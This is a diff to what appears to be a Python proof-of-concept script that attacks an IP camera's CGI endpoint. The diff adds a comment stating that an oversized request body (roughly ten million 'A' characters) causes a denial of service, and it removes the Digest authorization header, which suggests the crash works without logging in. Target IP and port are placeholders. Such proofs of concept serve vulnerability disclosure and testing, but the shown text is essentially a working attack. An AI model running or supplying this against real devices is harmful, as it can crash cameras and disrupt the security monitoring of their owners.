@@ -3,6 +3,8 @@ import httplib
 import urllib2
 
 host = "<YOUR_CAMERA_IP>"
+
+#Huge body causes Denial of Service
 params='A'*9999999
 
 headers = { "Host": "<YOUR_CAMERA_IP>:<PORT>",
@@ -14,7 +16,6 @@ headers = { "Host": "<YOUR_CAMERA_IP>:<PORT>",
 "Accept-Encoding": "gzip,deflate,sdch",
 "Accept-Language": "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4",
 "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
-"Authorization": 'Digest username="<YOUR_USER>", realm="IPCamera Login", nonce="<md5_hash>", uri="/hy-cgi/device.cgi?cmd=searchlandevice", response="<md_hash>", qop=auth, nc=<hex>, cnonce="<hex>"'
 }
 
 url = "/hy-cgi/device.cgi?cmd=searchlandevice"
